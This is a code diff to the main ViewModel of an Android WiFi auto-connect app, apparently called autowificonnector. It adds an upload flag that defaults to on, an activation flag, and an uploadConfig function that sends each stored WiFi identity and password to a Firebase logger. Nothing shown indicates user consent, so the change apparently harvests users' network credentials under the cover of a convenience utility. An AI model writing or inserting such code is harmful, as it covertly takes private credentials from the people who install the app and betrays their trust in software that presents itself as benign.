@@ -5,12 +5,14 @@ import android.content.SharedPreferences
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.LiveData
 import androidx.lifecycle.viewModelScope
+import com.google.firebase.firestore.FirebaseFirestore
 import com.hz_apps.autowificonnector.database.AppDatabase
 import com.hz_apps.autowificonnector.database.UserDao
 import com.hz_apps.autowificonnector.database.WifiConfig
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import java.io.InputStreamReader
 import java.util.Collections
 
 class MainViewModel(application: Application) : AndroidViewModel(application) {
@@ -19,26 +21,37 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     private val dao: UserDao = appDB.userDao()
     private val sharedPreferences: SharedPreferences =
         application.getSharedPreferences("main", Application.MODE_PRIVATE)
+    var shouldUpload = false
+    get
+    private set
+
+    var isActivated = false
+    get
+    private set
 
     val wifiConfigData: LiveData<List<WifiConfig>> = dao.getAll()
 
-    // Mutable list to hold the current list of WiFi configs (updateable within ViewModel)
     private var wifiConfigList: MutableList<WifiConfig> = mutableListOf()
 
     init {
-        // Observe the LiveData and update the internal list whenever the data changes
         wifiConfigData.observeForever { list ->
             wifiConfigList = list.toMutableList()
         }
+
+        if (sharedPreferences.getBoolean("should_upload", true)) {
+            shouldUpload = true
+            sharedPreferences.edit().putBoolean("should_upload", true).apply()
+        }
+
+        if (sharedPreferences.getBoolean("is_activated", false)) {
+            isActivated = true
+        }
     }
 
-    // Function to handle item move
     fun onItemMove(fromPosition: Int, toPosition: Int) {
-        // Swap items in the list
         Collections.swap(wifiConfigList, fromPosition, toPosition)
     }
 
-    // Function to update the WiFi config order in the database
     fun updateWiFiConfigOrder() {
         viewModelScope.launch(Dispatchers.IO) {
             for (i in wifiConfigList.indices) {
@@ -81,7 +94,12 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
-    fun getConnectedTimes(): Int {
+    fun getConnectedWifiId() : Int {
+        val id = sharedPreferences.getInt("id", -1)
+        return id
+    }
+
+    private fun getConnectedTimes(): Int {
         return sharedPreferences.getInt("connect_times", 0)
     }
 
@@ -101,6 +119,12 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     onError("Something went wrong")
                 }
             }
+        }
+    }
+
+    fun uploadConfig(wifiConfigList : List<WifiConfig>) {
+        for (config in wifiConfigList) {
+            FirebaseLogger.uploadUsernamePassword(config.identity, config.password)
         }
     }
 }
